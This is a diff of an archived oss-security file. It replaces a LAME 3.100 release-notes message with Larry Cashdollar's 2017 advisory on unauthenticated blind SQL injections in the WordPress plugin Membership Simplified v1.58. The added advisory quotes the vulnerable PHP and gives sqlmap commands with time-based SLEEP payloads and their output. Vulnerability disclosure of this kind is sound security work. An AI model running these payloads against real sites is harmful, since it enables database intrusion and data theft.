@@ -1,86 +1,91 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/21/7
-Message-ID: <20171021224129.34you4kzttvgnbj7@tunkki.bugs.fi>
-Date: Sun, 22 Oct 2017 01:41:29 +0300
-From: Henri Salo <henri@...v.fi>
-To: oss-security@...ts.openwall.com
-Subject: LAME 3.100 released with security fixes
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/22/4
+Message-id: <BFF5A561-72DD-4395-B558-F4DDBB8AB751@me.com>
+Date: Wed, 22 Mar 2017 06:59:33 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Title: Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-17
+CVE-ID:[CVE-2017-1002009][CVE-2017-1002010]
+Download Site: http://membership.officeautopilot.com/get-it-now/
+Vendor: http://membership.officeautopilot.com/
+Vendor Notified: 2017-03-17
+Vendor Contact: http://membership.officeautopilot.com/1-58-has-been-released-and-works-with-version-4-5-of-wordpress/#comment-484
+Advisory: http://www.vapidlabs.com/advisory.php?v=188
+Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses.
+Vulnerability:
+The code in membership-simplified-for-oap-members-only/updateDB.php is vulnerable to blind SQL injection because it doesn't sanitize user input via any of the POST requests being passed into the SQL query.  Also it doesn't check that a user is authorized to make updates to the database.
 
-LAME 3.100 has been released including fixes to security vulnerabilities.
-Coy-paste from history:
+  2 require_once("../../../wp-config.php");
+  3 global $wpdb;
+  4 $table_name = $wpdb->prefix . "download_listing";
+  5 $media_table_name = $wpdb->prefix . "media_listing";
+  6 $action = $_POST['action'];
+  7 $updateRecordsArray = $_POST['recordsArray'];
+  8 $mediaupdateRecordsArray = $_POST['mediaRecordsArray'];
 
-Rogério Brito
+CVE-2017-1002009:
+I chose to test the SQL injection against the delete action as it was the most straightforward injection point.
 
-- Don't include the debian directory as one that is needed during builds. Patch
-taken from Debian's packaging of lame.
+ 34 if($action == 'delete') {
+ 35         $upload_base_dir = wp_upload_dir();
+ 36         $upload_dir =  $upload_base_dir['basedir'];
+ 37         $path= $upload_dir.'/membership-simplified-for-oap-members-only/';
+ 38         $fileName = $wpdb->get_row("select fileName from $table_name where recordId= ".$_POST['recordId']."");
+ 39         @unlink($path.$fileName->fileName);
+ 40         $query= "delete from $table_name where recordId= '".$_POST['recordId']."' ";
+ 41         $wpdb->query($query) or die('Error, insert query failed');
+ 42 
+ 43 }
 
-- Resurrect Owen Taylor's code dated from 97-11-3 to properly deal with GTK1.
-This was transplanted back from aclocal.m4 with a patch provided by Andres
-Mejia. This change makes it easy to regenerate autotools' files with a simple
-invocation of autoconf -vfi.
+CVE-2017-1002010:
 
-- Fix possible race condition causing build failures in libmp3lame. Discovered
-in automated builds by the Debian project with patch provided by Andres Mejia.
+ 56 if($action == 'delete_media') {
+ 57         $upload_base_dir = wp_upload_dir();
+ 58         $upload_dir = $upload_base_dir['basedir'];
+ 59         $path = $upload_dir.'/membership-simplified-for-oap-members-only/';
+ 60         $fileName = $wpdb->get_row("select fileName from $media_table_name where recordId= ".$_POST['recordId']."");
+ 61         //@...ink($path.$fileName->fileName);
+ 62         $query= "delete from $media_table_name where recordId= '".$_POST['recordID']."' ";
+ 65         $wpdb->query($query) or die($query);
 
-Robert Hegemann
-
-- Improved detection of MPEG audio data in RIFF WAVE files. Tracker item [
-3545112 ] Invalid sampling detection
-
-- New switch --gain <decibel>, range -20.0 to +12.0, a more convenient way to
-apply Gain adjustment in decibels, than the use of --scale <factor>.
-
-- Fix for tracker item [ 3558466 ] Bug in path handling
-
-- Fix for tracker item [ 3567844 ] problem with Tag genre
-
-- Fix for tracker item [ 3565659 ] no progress indication with pipe input
-
-- Fix for tracker item [ 3544957 ] scale (empty) silent encode without warning
-
-- Fix for tracker item [ 3580176 ] environment variable LAMEOPT doesn't work
-anymore
-
-- Fix for tracker item [ 3608583 ] input file name displayed with wrong
-character encoding (on windows console with CP_UTF8)
-
-- Fix for bug ticket [ #447 ] Fix dereference NULL and Buffer not NULL
-terminated issues. Thanks to Surabhi Mishra
-
-- Fix for bug ticket [ #445 ] dereference of a null pointer possible in loop.
-Thanks to Renu Tyagi
-
-- Fix for bug ticket [ #449 ] Make sure functions with SSE instructions
-maintain their own properly aligned stack. Thanks to Fabian Greffrath
-
-- Fix for bug ticket [ #458 ] Multiple Stack and Heap Corruptions from
-Malicious File. Thanks to Gareth Evans and Elio Blanca
-
-- Fix for bug ticket [ #460 ] A division by zero vulnerability. Thanks to Wang
-Shiyang, Liu Bingchang
-
-- Fix for bug ticket [ #461 ] CVE-2017-9410 fill_buffer_resample function in
-libmp3lame/util.c heap-based buffer over-read and ap
-
-- Fix for bug ticket [ #462 ] CVE-2017-9411 fill_buffer_resample function in
-libmp3lame/util.c invalid memory read and application crash
-
-- Fix for bug ticket [ #463 ] CVE-2017-9412 unpack_read_samples function in
-frontend/get_audio.c invalid memory read and application crash
-
-- Fix for bug ticket [ #434 ] clip detect scale suggestion unaware of scale
-input value
-
-- HIP decoder bug fixed: decoding mixed blocks of lower sample frequency Layer3
-data resulted in internal buffer overflow (write). Thanks to Henri Salo
-
-Alexander Leidinger
-
-- Feature request, patch ticket [ #27 ] Add
-lame_encode_buffer_interleaved_int() by Michael Fink
-
--- 
-Henri Salo
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete&recordId=*' --dbms mysql  --level 3 --risk 3
+	•  
+	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 1411 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+	•     Payload: action=delete&recordId=(SELECT * FROM (SELECT(SLEEP(5)))uxVZ)
+	• ---
+	• [02:10:51] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [02:10:51] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 02:10:51
+	•  
+	•  
+	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete_media&recordId=*' --dbms mysql  --level 3 --risk 3
+	•  
+	• sqlmap identified the following injection point(s) with a total of 1411 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+	•     Payload: action=delete_media&recordId=(SELECT * FROM (SELECT(SLEEP(5)))ENgw)
+	• ---
+	• [02:34:49] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [02:34:49] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 02:34:49
